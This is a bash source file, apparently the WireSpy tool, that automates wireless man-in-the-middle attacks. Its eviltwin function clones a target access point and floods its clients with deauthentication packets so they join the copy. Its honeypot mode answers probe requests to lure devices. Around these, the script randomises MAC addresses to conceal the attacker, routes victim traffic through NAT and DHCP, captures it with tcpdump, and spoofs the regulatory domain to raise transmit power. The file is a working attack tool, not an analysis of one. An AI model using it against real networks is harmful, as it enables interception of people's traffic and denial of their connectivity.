#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# * Fix channel restrictions (WCHAN)
# * Implement a stop running attack feature
# * Implement an eval function - everything after ! would be executed as a system command
# * Implement output coloring
# * Make the 'quit' option clearer by changing its name with back or menu whenever needed

# enable stricter programming rules (turns some bugs into errors)
# set -Eeuo pipefail

declare -gr  PROGNAME=$(basename $0)
declare -gr  PROGBASENAME=${PROGNAME%%.*}
declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
declare -gr  PROGVERSION=0.6
declare -gr  GIT_BRANCH='master'
declare -gar REQUIRED_PACKAGES=( # to comment when experiencing any issue with the dependencies
    'aircrack-ng'
    'coreutils'
    'git'
    'grep'
    'isc-dhcp-server'
    'macchanger'
    'procps'
    'rfkill'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure a honeypot or an eviltwin'
declare -gr EVILTWIN_INFO="""
This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets \
to its clients to force them to connect to our evil copy. Consequently, choose the same ESSID, BSSID and \
wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a \
target. Next step is to copy the BSSID, ESSID and channel of the selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect \
to the evil twin.
"""

declare -g isHoneypot=false
declare -g isEviltwin=false

declare -gr REGEX_MAC_ADDRESS='^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$'
declare -gr REGEX_TINTF='^at[[:digit:]]+$' # according to airbase-ng documentation the tap interface is always like atX
declare -g  INTF=''
declare -g  MINTF=''
declare -g  TINTF=''
declare -g  WINTF=''

declare -gi PID_AIRBASE=0
declare -gi PID_AIREPLAY=0
declare -gi PID_TCPDUMP=0

declare -gr PROMPT=$(printf "%s »" "$PROGBASENAME")
declare -gr PROMPT_ET=$(printf "%s > %-8.8s »" "$PROGBASENAME" "eviltwin")
declare -gr PROMPT_HP=$(printf "%s > %-8.8s »" "$PROGBASENAME" "honeypot")
declare -gr PROMPT_PU=$(printf "%s > %-8.8s »" "$PROGBASENAME" "powerUp")
declare -g  PS3="$(echo -e $PROMPT) "

print()        { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
printError()   { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "error" "$@"; }
printInfo()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "information" "$@"; }
printIntf()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "interface" "$@"; }
printStatus()  { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "status" "$@"; }
printWarning() { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "warning" "$@"; }
printHP()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "honeypot" "$@"; }
printET()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "eviltwin" "$@"; }
printPU()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "powerUp" "$@"; }

trap quit INT

function quit() {
    cleanUp
    exit 130
}

function banner() {
cat <<- BANNER
${PROGBASENAME^} v$PROGVERSION (type 'help' for a list of commands)
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER
}

function checkUpdate() {
    print 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
    then
        if [[ $(git diff --name-only origin/$GIT_BRANCH -- ${0}) ]]
        then
            print 'A new version is available, consider updating using the command: git reset --hard && git pull origin $GIT_BRANCH --rebase'
        else
            print 'This is the latest stable version'
        fi
    else
        printWarning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}

function checkCompatibility() {
    local eflag=false # exit boolean
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        eflag=true
        printError "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satisfied'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            eflag=true
            printError "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $eflag = true ]]
    then
        exit 1
    fi

    print "All of the required packages are already installed"
    echo '' # add new line
}

function usage {
cat <<- USAGE

Attacks:
    eviltwin      > launch an evil twin attack
    honeypot      > launch a rogue access point attack

Commands:
    clear         > clear the terminal
    help          > list available commands
    quit|exit     > exit the program
    apscan        > show all wireless access points nearby
    leases        > display DHCP leases
    powerup       > power wireless interface up (may cause issues)
    start capture > start packet capture (tcpdump)
    stop capture  > stop packet capture (tcpdump)
    status        > show modules status

USAGE
}

function menu() {
    cleanUp &> /dev/null

    while :
    do
        read -p  "$(echo -e $PROMPT) "
        case $REPLY in
            'clear')
                clear
                ;;
            'quit'|'exit')
                quit
                ;;
            'help')
                usage
                ;;
            'eviltwin')
                PS3="$(echo -e $PROMPT_ET) "
                checkRunningAttack 'eviltwin'
                isEviltwin=true
                ;;
            'honeypot')
                PS3="$(echo -e $PROMPT_HP) "
                checkRunningAttack 'honeypot'
                isHoneypot=true
                ;;
            'apscan')
                checkRunningAttack 'APScan'
                ;;
            'lease'|'leases')
                checkAPRequirements 'displayDHCPleases'
                ;;
            'powerup')
                PS3="$(echo -e $PROMPT_PU) "
                checkRunningAttack 'powerUp'
                ;;
            'start capture')
                checkAPRequirements 'startCapture'
                ;;
            'stop capture')
                checkAPRequirements 'stopCapture'
                ;;
            'status')
                showStatus
                ;;
            *)
                printWarning "Invalid command: ${REPLY}. Type help for the list of available commands"
                ;;
        esac
    done
}

function checkRunningAttack() {
    local -r delegated_function=$1

    if [[ $isHoneypot = true || $isEviltwin = true ]]
    then
        printWarning "An attack (honeypot|eviltwin) is currently taking place. Do you wish to stop to start ${delegated_function}?"
        select option in 'yes' 'no'
        do
            case $option in
                'yes') 
                    printInfo "Stopping the running attack..."
                    cleanUp &> /dev/null
                    isHoneypot=false
                    isEviltwin=false
                    $delegated_function
                    break
                    ;;
                'no')
                    break
                    ;;
            esac
        done
    else
        $delegated_function
    fi
}

function eviltwin() {
    attackPrerequisites

    setManagedMode $MINTF 1> /dev/null && APScan $MINTF && setMonitorMode $MINTF 1> /dev/null
    
    echo "$EVILTWIN_INFO"

    printET 'Enter the eviltwin ESSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    printET 'Enter the eviltwin BSSID (the value must be identical to the legitimate access-point to spoof):'
    while :
    do
        read -p "$(echo -e $PROMPT) "
        if [[ $REPLY =~ $REGEX_MAC_ADDRESS ]]
        then
            local -r eviltwin_BSSID=$REPLY
            break
        else
            printWarning "Invalid MAC address: $REPLY. The correct format should be XX:XX:XX:XX:XX:XX"
        fi
    done

    printET 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
    while :
    do
        read -p "$(echo -e $PROMPT) "
        case $REPLY in 
            'quit')
                menu
                ;;
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                printWarning "Invalid channel: $REPLY"
                ;;
        esac
    done

    local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

    xterm -fg green -title "Eviltwin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
    PID_AIRBASE=$!
    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')

    if ! [[ $TINTF =~ $REGEX_TINTF ]]
    then
        printError "$AIRBASE_ERROR"
        menu
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e $eviltwin_ESSID $MINTF" &
    PID_AIREPLAY=$!
    sleep 4

    enableInternetAccess
    
    printInfo "The eviltwin $eviltwin_ESSID is now running..."
    sleep 4
}

function honeypot() {
    attackPrerequisites

    echo ''

    local -ar options=(
        "Blackhole: The access point type will respond to all probe requests (the access point may receive a lot \
of requests in areas with high levels of WiFi activity such as crowded public places)."
        'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
    )

    printHP 'Select the type of honeypot you want to set up:'
    select option in "${options[@]}" 'quit'
    do
        case $REPLY in
            1) 
                local -ir attack_type=1
                break
                ;;
            2) 
                local -ir attack_type=2
                break
                ;;
            3)
                menu
                ;;
        esac
    done

    printHP 'Enter the honeypot ESSID:'
    read -p "$(echo -e $PROMPT) " ESSID

    printHP 'Enter the honeypot wireless channel (value must be between 1 and 12):'
    while :
    do
        read -p "$(echo -e $PROMPT) "
        case $REPLY in 
            [1-9]|1[0-2])
                local -ir WCHAN=$REPLY
                break
                ;;
            *) 
                printWarning "Invalid channel: $REPLY"
                ;;
        esac
    done

    printHP 'Do you want to enable WEP authentication?'
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes')
                local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

                printHP 'Enter a WEP password (the value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                esac
                break
                ;;
            'no') 
                local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;  
                esac
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')

    if ! [[ $TINTF =~ $REGEX_TINTF ]]
    then
        printError "$AIRBASE_ERROR"
        menu
    fi

    enableInternetAccess
    
    printInfo "The honeypot $ESSID is now running..."
    sleep 4
}

function attackPrerequisites() {
    local -a INTERFACES

    print 'Select the Internet-facing interface:'
    getIntfs INTERFACES
    select option in "${INTERFACES[@]}" 'quit'
    do
        case $option in
          'quit')
                menu
                ;;
            *)
                if [[ $option ]]
                then
                    INTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                printInfo "Randomising $INTF MAC address..."
                ip link set $INTF down && macchanger -A $INTF && ip link set $INTF up
                printWarning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
                break
                ;;
            'no') 
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    local -a WINTERFACES

    print 'Select the wireless interface to use:'
    getWIntfs WINTERFACES
    select option in "${WINTERFACES[@]}" 'quit'
    do
        case $option in
            'quit')
                menu
                ;;
            *)
                if [[ $option ]]
                then
                    WINTF=$(echo "$option" | awk -F': ' '{print $1}')

                    if [[ $WINTF = $INTF ]]
                    then
                        printWarning "$WINTF is already in use, select another interface"
                    else
                        break
                    fi
                fi
                ;;
        esac
    done

    # prevent wlan adapter soft blocking
    rfkill unblock wifi

    setMonitorMode $WINTF
    MINTF=$WINTF
    
    print "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                printInfo "Randomising $MINTF MAC address..."
                ip link set $MINTF down && macchanger -A $MINTF && ip link set $MINTF up
                break
                ;;
            'no')
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    printInfo "Killing processes that may interfere with the honeypot|eviltwin..."
    airmon-ng check kill | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' # remove newlines

    sleep 4

    if ! [[ -d "${PROGDIR}/temp" ]]
    then
        mkdir "${PROGDIR}/temp"
    fi
}

function enableInternetAccess() {
    # configuring the newly created tap intrface
    ip addr flush dev $TINTF
    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
    ip route flush dev $TINTF
    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF

    printInfo 'Enabling IP forwarding...'
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # setting up ip address and route

    printInfo 'Configuring NAT iptables...'
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE

    # reset any pre-existing dhcp leases
    printInfo 'Resetting pre-existing DHCP leases...'
    cat /dev/null > '/var/lib/dhcp/dhcpd.leases'
    cat /dev/null > '/tmp/dhcpd.conf'

    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    printInfo 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations...'
    cp --backup "${PROGDIR}/config/dhcpd.conf" '/etc/dhcp/dhcpd.conf'
    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" '/etc/default/isc-dhcp-server'

    # starting the DHCP service
    printInfo 'Starting DHCP server to provide the victims with internet access...'
    /etc/init.d/isc-dhcp-server start 
    sleep 4
}

function powerUp() {
    local -a WINTERFACES
    local    WINTF=$1

    if ! [[ $WINTF ]]
    then
        print 'Select the wireless interface to boost-up:'
        getWIntfs WINTERFACES
        select option in "${WINTERFACES[@]}" 'quit'
        do
            case $option in
                'quit')
                    menu
                    ;;
                *)
                    if [[ $option ]]
                    then
                        WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                        break
                    fi
                    ;;
            esac
        done
    fi

    printPU "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
        then
            local -ir BOOST=$REPLY
            break
        else
            printWarning "Invalid value: $REPLY"
        fi
    done

    printInfo "Powering ${WINTF} up..."
    # Bolivia allows high power levels
    ip link set $WINTF down && iw reg set BO && iw dev $WINTF set txpower fixed $BOOST && ip link set $WINTF up
    sleep 4

    echo ''
    iw dev $WINTF info
    echo ''
}

function APScan() {
    local -a WINTERFACES
    local    WINTF=$1

    if ! [[ $WINTF ]]
    then
        print 'Select the wireless interface to use:'
        getWIntfs WINTERFACES
        select option in "${WINTERFACES[@]}" 'quit'
        do
            case $option in
                'quit')
                    menu
                    ;;
                *)
                    if [[ $option ]]
                    then
                        WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                        break
                    fi
                    ;;
            esac
        done
    fi

    if isMonitorMode $WINTF
    then
        printWarning "$WINTF is in monitor mode. Do you wish to switch it to managed mode (this will kill any running honeypot|eviltwin)?"
        select option in 'yes' 'no' 'quit'
        do
            case $option in
                'yes')
                    setManagedMode $WINTF
                    echo ''
                    iw $WINTF scan | sed -e 's#(on wlan# (on wlan#g' | awk -f "${PROGDIR}/config/iw_parsing.awk"
                    echo ''
                    menu
                    break
                    ;;
                'no') 
                    break
                    ;;
                'quit')
                    menu
                    ;;
            esac
        done
    else
        echo ''
        iw $WINTF scan | sed -e 's#(on wlan# (on wlan#g' | awk -f "${PROGDIR}/config/iw_parsing.awk"
        echo ''
    fi
}

function getIntfs() {
    local -r INTFS=$(ip -o link show | awk -F': ' '!/lo/{print $2}')
    local -n _INTERFACES=$1 # referenced copy of the array passed to the function

    if [[ $INTFS ]]
    then
        _INTERFACES=()

        for i in $INTFS
        do # get the network interfaces names
            IP=$(ip -o -f inet add show $i | awk '{print $4}')
            MAC=$(ip link show $i | awk '/ether/ {print $2}')
            _INTERFACES+=("${i}: $IP $MAC")
        done
    else
        printError 'No networking interface detected'
        menu
    fi
}

function getWIntfs() {
    local -r WINTFS=$(ip -o link show | awk -F': ' '{print $2}' | egrep 'wlan[[:digit:]]+')
    local -n _WINTERFACES=$1 # referenced copy of the array passed to the function

    if [[ $WINTFS ]]
    then    
        _WINTERFACES=()

        for i in $WINTFS
        do # get the interfaces names
            IP=$(ip -o -f inet add show $i | awk '{print $4}')
            MAC=$(ip link show $i | awk '/ether/ {print $2}')
            _WINTERFACES+=("${i}: $IP $MAC")
        done
    else
        printError 'No wireless interface detected'
        menu
    fi
}

function showStatus() {
    local honeypot_status='not running'
    local eviltwin_status='not running'
    local tcpdump_status='not running'

    if [[ $isEviltwin = true ]]
    then
        eviltwin_status='running...'
    fi
    if [[ $isHoneypot = true ]]
    then
        honeypot_status='running...'
    fi
    if (( $PID_TCPDUMP > 0 ))
    then
        tcpdump_status='running...'
    fi

cat <<- STATUS

    eviltwin       > $eviltwin_status
    honeypot       > $honeypot_status
    packet capture > $tcpdump_status

STATUS
}

function checkAPRequirements() {
    local -r delegated_function=$1

    if [[ $isHoneypot = false && $isEviltwin = false ]]
    then
        printWarning "$AP_PREREQUISITE"
    else
        $delegated_function
    fi
}

function displayDHCPleases() {
    if [[ $(cat /var/run/dhcpd.pid) ]]
    then
        cat /var/lib/dhcp/dhcpd.leases
    else
        printWarning 'The DHCP server has not been started'
    fi
}

function startCapture() {
    if (( $PID_TCPDUMP == 0 ))
    then
        if ! [[ -d "${PROGDIR}/logs" ]]
        then
            mkdir "${PROGDIR}/logs"
        fi

        printInfo "Packet capture started, the resulting file will be ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
        # we want to keep the stderr in case of problem
        PID_TCPDUMP=$(tcpdump -i $TINTF -w ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
    else
        printWarning 'The traffic is already being captured'
    fi
}

function stopCapture() {
    if (( $PID_TCPDUMP > 0 ))
    then
        printInfo "Packet capture stopped"
        kill -SIGTERM "$PID_TCPDUMP"
        PID_TCPDUMP=0
    else
        printWarning 'No packet capture has been launched'
    fi
}

function isManagedMode() {
    local    WINTF=$1
    local -r isManagedMode=$(iw dev $WINTF info | grep 'managed')

    if [[ $isManagedMode ]]
    then
        return 0
    else
        return 1
    fi
}

function isMonitorMode() {
    local    WINTF=$1
    local -r isMonitorMode=$(iw dev $WINTF info | grep 'monitor')

    if [[ $isMonitorMode ]]
    then
        return 0
    else
        return 1
    fi
}

function setManagedMode() {
    local WINTF=$1

    if ! isManagedMode $WINTF
    then
        printInfo "Starting managed mode on ${WINTF}..."
        ip link set $WINTF down && iw dev $WINTF set type managed && ip link set $WINTF up
        sleep 2

        if ! isManagedMode $WINTF
        then
            printError "$WINTF could not enter managed mode, inspect this issue manually"
            menu
        fi
    fi
}

function setMonitorMode() {
    local WINTF=$1

    if ! isMonitorMode $WINTF
    then
        printInfo "Starting monitor mode on ${WINTF}..."
        ip link set $WINTF down && iw dev $WINTF set type monitor && ip link set $WINTF up
        sleep 2

        if ! isMonitorMode $WINTF
        then
            printError "$WINTF could not enter monitor mode, inspect this issue manually"
            menu
        fi
    fi
}

function cleanUp() {
    if [[ $isHoneypot = true || $isEviltwin = true ]]
    then
        printInfo 'Terminating active processes...'
        if (( $PID_AIRBASE > 0 ))
        then
            kill -SIGTERM "$PID_AIRBASE"
            PID_AIRBASE=0
        fi
        if (( $PID_AIREPLAY > 0 ))
        then
            kill -SIGTERM "$PID_AIREPLAY"
            PID_AIREPLAY=0
        fi
        sleep 2
    
        printInfo 'Removing temporary files...'
        rm -rf "${PROGDIR}/temp"

        printInfo 'Disabling IP forwarding...'
        echo 0 > /proc/sys/net/ipv4/ip_forward

        printInfo 'Flushing iptables...'
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain

        printInfo 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations...'
        mv '/etc/dhcp/dhcpd.conf~' '/etc/dhcp/dhcpd.conf'
        mv '/etc/default/isc-dhcp-server.bak' '/etc/default/isc-dhcp-server'

        printInfo 'Stopping DHCP server...'
        /etc/init.d/isc-dhcp-server stop
    fi
    if [[ $MINTF ]]
    then
        setManagedMode $MINTF
        MINTF=''
    fi
    if (( $PID_TCPDUMP > 0 ))
    then
        printInfo 'Terminating tcpdump...'
        kill -SIGTERM "$PID_TCPDUMP"
        PID_TCPDUMP=0
        sleep 2
    fi
}

# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]
then
    printError "You must run this script as as root using the command: sudo bash ${BASH_SOURCE[0]}"
    exit 1
fi

banner
checkUpdate
checkCompatibility
menu
